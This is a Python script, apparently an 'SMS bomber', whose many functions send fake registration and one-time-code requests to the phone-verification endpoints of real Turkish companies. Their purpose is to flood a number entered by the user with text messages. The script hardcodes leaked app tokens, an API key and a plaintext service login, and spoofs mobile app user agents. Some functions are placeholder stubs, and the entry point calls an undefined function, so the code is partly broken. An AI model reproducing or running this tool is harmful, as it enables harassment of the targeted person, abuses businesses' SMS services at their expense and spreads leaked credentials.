try:
    import requests
    import urllib3
    import uuid
except ImportError:
    print("Gerekli modüller indiriliyor bekleyiniz...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])
finally:
    import concurrent.futures
    import json
    import os
    import subprocess
    import sys
    import random
    import requests
    import string
    import time
    import urllib
    import urllib3
    import uuid


def KahveDunyasi(number):    
    try:    
        url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Page-Url": "/kayit-ol",
            "Content-Type": "application/json;charset=utf-8",
            "Positive-Client": "kahvedunyasi",
            "Positive-Client-Type": "web",
            "Store-Id": "1",
            "Origin": "https://www.kahvedunyasi.com",
            "Dnt": "1",
            "Sec-Gpc": "1",
            "Referer": "https://www.kahvedunyasi.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Te": "trailers",
            "Connection": "close"
        }
        json_data = {"mobile_number": number, "token_type": "register_token"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "KahveDunyasi"
        else:
            return False, "KahveDunyasi"
    except:    
        return False, "KahveDunyasi"


def Wmf(number):
    try:
        wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
            "confirm": "true",
            "date_of_birth": "1956-03-01",
            "email": "",  # Replace with appropriate email data
            "email_allowed": "true",
            "first_name": "Memati",
            "gender": "male",
            "last_name": "Bas",
            "password": "31ABC..abc31",
            "phone": f"0{number}"
        }, timeout=6)
        if wmf.status_code == 202:
            return True, "Wmf"
        else:
            return False, "Wmf"
    except:
        return False, "Wmf"



def KahveDunyasi_sms_gonder(numara):
    try:
        url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
        payload = {
            "mobile_number": numara,
            "message": "Your SMS message here",
            "token_type": "register_token"
        }
        headers = {
            "Authorization": "Bearer your_api_key_here",
            "Content-Type": "application/json"
        }
        response = requests.post(url, json=payload, headers=headers)
        
        if response.status_code == 200:
            return True, "KahveDunyasi: SMS gönderildi"
        else:
            return False, "KahveDunyasi: SMS gönderilemedi"
    except Exception as e:
        return False, f"KahveDunyasi: {str(e)}"


def Wmf_sms_gonder(numara):
    try:
        url = "https://www.wmf.com.tr/users/register/"
        payload = {
            "phone": numara,
            "message": "Your SMS message here"
        }
        headers = {
            "Authorization": "Bearer your_api_key_here",
            "Content-Type": "application/json"
        }
        response = requests.post(url, json=payload, headers=headers)
        
        if response.status_code == 200:
            return True, "Wmf: SMS gönderildi"
        else:
            return False, "Wmf: SMS gönderilemedi"
    except Exception as e:
        return False, f"Wmf: {str(e)}"


def Icq_sms_gonder(numara):
    try:
        url = "https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php"
        payload = {
            "msisdn": numara,
            "message": "Your SMS message here"
        }
        headers = {
            "Authorization": "Bearer your_api_key_here",
            "Content-Type": "application/json"
        }
        response = requests.post(url, json=payload, headers=headers)
        
        if response.status_code == 200:
            return True, "Icq: SMS gönderildi"
        else:
            return False, "Icq: SMS gönderilemedi"
    except Exception as e:
        return False, f"Icq: {str(e)}"


def Suiste_sms_gonder(numara):
    try:
        url = "https://suiste.com:443/api/auth/code"
        payload = {
            "gsm": numara,
            "message": "Your SMS message here"
        }
        headers = {
            "Authorization": "Bearer your_api_key_here",
            "Content-Type": "application/json"
        }
        response = requests.post(url, json=payload, headers=headers)
        
        if response.status_code == 200:
            return True, "Suiste: SMS gönderildi"
        else:
            return False, "Suiste: SMS gönderilemedi"
    except Exception as e:
        return False, f"Suiste: {str(e)}"


def Evidea_sms_gonder(numara):
    try:
        url = "https://www.evidea.com:443/users/register/"
        payload = {
            "phone": numara,
            "message": "Your SMS message here"
        }
        headers = {
            "Authorization": "Bearer your_api_key_here",
            "Content-Type": "application/json"
        }
        response = requests.post(url, json=payload, headers=headers)
        
        if response.status_code == 200:
            return True, "Evidea: SMS gönderildi"
        else:
            return False, "Evidea: SMS gönderilemedi"
    except Exception as e:
        return False, f"Evidea: {str(e)}"




def Ucdortbes_sms_gonder(numara):
    try:
        url = "https://api.345dijital.com:443/api/users/register"
        payload = {
            "email": "",
            "name": "Memati",
            "surname": "Bas",
            "phoneNumber": f"+90{numara}"
        }
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Authorization": "null"
        }
        response = requests.post(url, json=payload, headers=headers, timeout=6)
        
        if response.status_code == 200:
            return True, "345dijital.com: SMS gönderildi"
        else:
            return False, "345dijital.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"345dijital.com: {str(e)}"


def Ayyildiz_sms_gonder(numara):
    try:
        url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={numara}"
        headers = {
            "Accept": "*/*",
            "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
            "Devicetype": "mobileapp"
        }
        response = requests.post(url, headers=headers, timeout=6)
        
        if response.status_code == 200:
            return True, "ayyildiz.com.tr: SMS gönderildi"
        else:
            return False, "ayyildiz.com.tr: SMS gönderilemedi"
    except Exception as e:
        return False, f"ayyildiz.com.tr: {str(e)}"


def Naosstars_sms_gonder(numara):
    try:
        url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
        payload = {
            "telephone": f"+90{numara}",
            "type": "register"
        }
        headers = {
            "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
            "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "Access-Control-Allow-Origin": "*",
            "Locale": "en-TR",
            "Version": "1.0030",
            "Os": "ios",
            "Apiurl": "https://api.naosstars.com/api/",
            "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
            "Platform": "ios",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Apitype": "mobile_app"
        }
        response = requests.post(url, json=payload, headers=headers, timeout=6)
        
        if response.status_code == 200:
            return True, "naosstars.com: SMS gönderildi"
        else:
            return False, "naosstars.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"naosstars.com: {str(e)}"



def Metro_sms_gonder(numara):
    try:
        url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Applicationversion": "2.1.1",
            "Applicationplatform": "2",
            "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1",
            "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
            "Connection": "close"
        }
        payload = {
            "methodType": "2",
            "mobilePhoneNumber": f"+90{numara}"
        }
        response = requests.post(url, headers=headers, json=payload, timeout=6)
        
        if response.status_code == 200 and response.json()["status"] == "success":
            return True, "metro-tr.com: SMS gönderildi"
        else:
            return False, "metro-tr.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"metro-tr.com: {str(e)}"


def Akasya_sms_gonder(numara):
    try:
        url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5",
            "User-Agent": "Akasya",
            "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
            "Accept-Encoding": "gzip, deflate, br"
        }
        payload = {"phone": numara}
        response = requests.post(url=url, headers=headers, json=payload, timeout=6)
        
        if response.status_code == 200 and response.json()["result"] == "SMS sended succesfully!":
            return True, "akasya-admin.poilabs.com: SMS gönderildi"
        else:
            return False, "akasya-admin.poilabs.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"akasya-admin.poilabs.com: {str(e)}"


def Akbati_sms_gonder(numara):
    try:
        url = "https://akbati-admin.poilabs.com:443/v1/tr/sms"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3",
            "User-Agent": "Akbat",
            "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9",
            "Accept-Encoding": "gzip, deflate, br"
        }
        payload = {"phone": numara}
        response = requests.post(url=url, headers=headers, json=payload, timeout=6)
        
        if response.status_code == 200 and response.json()["result"] == "SMS sended succesfully!":
            return True, "akbati-admin.poilabs.com: SMS gönderildi"
        else:
            return False, "akbati-admin.poilabs.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"akbati-admin.poilabs.com: {str(e)}"


def Clickme_sms_gonder(numara):
    try:
        url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
        headers = {
            "Content-Type": "application/json",
            "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc",
            "Client-Version": "1.4.0",
            "Client-Device": "IOS",
            "Accept-Language": "tr-TR,tr;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"
        }
        payload = {"phone": numara}
        response = requests.post(url=url, json=payload, headers=headers, timeout=6)
        
        if response.status_code == 200 and response.json()["isSuccess"] == True:
            return True, "mobile-gateway.clickmelive.com: SMS gönderildi"
        else:
            return False, "mobile-gateway.clickmelive.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"mobile-gateway.clickmelive.com: {str(e)}"
    
    

def Happy_sms_gonder(numara):
    try:
        url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Origin": "https://www.happy.com.tr",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
            "Referer": "https://www.happy.com.tr/index.php?route=account/register"
        }
        data = {"telephone": numara}
        response = requests.post(url=url, data=data, headers=headers, timeout=6)
        
        if response.status_code == 200:
            return True, "happy.com.tr: SMS gönderildi"
        else:
            return False, "happy.com.tr: SMS gönderilemedi"
    except Exception as e:
        return False, f"happy.com.tr: {str(e)}"


def Komagene_sms_gonder(numara):
    try:
        url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
        headers = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
        }
        json_data = {"Telefon": numara, "FirmaId": "32"}
        response = requests.post(url=url, headers=headers, json=json_data, timeout=6)
        
        if response.status_code == 200 and response.json()["Success"] == True:
            return True, "gateway.komagene.com.tr: SMS gönderildi"
        else:
            return False, "gateway.komagene.com.tr: SMS gönderilemedi"
    except Exception as e:
        return False, f"gateway.komagene.com.tr: {str(e)}"


def KuryemGelsin_sms_gonder(numara):
    try:
        url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
        json_data = {"phoneNumber": numara, "phone_country_code": "+90"}
        response = requests.post(url=url, json=json_data, timeout=6)
        
        if response.status_code == 200:
            return True, "api.kuryemgelsin.com: SMS gönderildi"
        else:
            return False, "api.kuryemgelsin.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"api.kuryemgelsin.com: {str(e)}"


def Porty_sms_gonder(numara):
    try:
        url = "https://panel.porty.tech:443/api.php?"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
            "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
        }
        json_data = {"job": "start_login", "phone": numara}
        response = requests.post(url=url, json=json_data, headers=headers, timeout=6)
        
        if response.status_code == 200 and response.json()["status"] == "success":
            return True, "panel.porty.tech: SMS gönderildi"
        else:
            return False, "panel.porty.tech: SMS gönderilemedi"
    except Exception as e:
        return False, f"panel.porty.tech: {str(e)}"
            
 

def Taksim_sms_gonder(numara):
    try:
        url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "tr-TR,tr;q=0.9",
            "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
            "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="
        }
        json_data = {
            "countryPhoneCode": "+90",
            "name": "Memati",
            "phoneNo": numara,
            "surname": "Bas"
        }
        response = requests.post(url=url, headers=headers, json=json_data, timeout=6)
        
        if response.status_code == 200 and response.json()["success"] == True:
            return True, "service.taksim.digital: SMS gönderildi"
        else:
            return False, "service.taksim.digital: SMS gönderilemedi"
    except Exception as e:
        return False, f"service.taksim.digital: {str(e)}"


def Tasdelen_sms_gonder(numara):
    try:
        url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
        json_data = {
            "PhoneNumber": numara,
            "user": {
                "Password": "Aa123!35@1",
                "UserName": "MobilOperator"
            }
        }
        response = requests.post(url=url, json=json_data, timeout=6)
        
        if response.status_code == 200 and response.json()["Result"] == True:
            return True, "94.102.66.162:80: SMS gönderildi"
        else:
            return False, "94.102.66.162:80: SMS gönderilemedi"
    except Exception as e:
        return False, f"94.102.66.162:80: {str(e)}"


def Tasimacim_sms_gonder(numara):
    try:
        url = "https://server.tasimacim.com/requestcode"
        json_data = {"phone": numara, "lang": "tr"}
        response = requests.post(url=url, json=json_data, timeout=6)
        
        if response.status_code == 200:
            return True, "server.tasimacim.com: SMS gönderildi"
        else:
            return False, "server.tasimacim.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"server.tasimacim.com: {str(e)}"


def ToptanTeslim_sms_gonder(numara):
    try:
        url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Mode": "no-cors",
            "U": "e-ticaret",
            "User-Agent": "eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
            "Accept-Language": "tr-TR,tr;q=0.9",
            "Accept-Encoding": "gzip, deflate, br"
        }
        data = {
            "ADRES": "ZXNlZGtm",
            "DIL": "tr_TR",
            "EPOSTA": "",  # Change to your email if needed
            "EPOSTA_BILDIRIM": True,
            "ILCE": "BAŞAKŞEHİR",
            "ISLEM": "KayitOl",
            "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677",
            "KIMLIKNO": None,
            "KULLANICI_ADI": "Memati",
            "KULLANICI_SOYADI": "Bas",
            "PARA_BIRIMI": "TL",
            "PAROLA": "312C6383DE1465D08F635B6121C1F9B4",
            "POSTAKODU": "377777",
            "SEHIR": "İSTANBUL",
            "SEMT": "BAŞAKŞEHİR MAH.",
            "SMS_BILDIRIM": True,
            "TELEFON": numara,
            "TICARI_UNVAN": "kdkd",
            "ULKE_ID": 1105,
            "VERGI_DAIRESI": "sjje",
            "VERGI_NU": ""
        }
        response = requests.post(url, headers=headers, data=data, timeout=6)
        
        if response.status_code == 200 and response.json()["Durum"] == True:
            return True, "toptanteslim.com: SMS gönderildi"
        else:
            return False, "toptanteslim.com: SMS gönderilemedi"
    except Exception as e:
        return False, f"toptanteslim.com: {str(e)}"



if __name__ == "__main__":
    numara = input("Global No Sorgu İçin +90 Şeklinde Giriniz:")
    sms_gonder(numara)
    
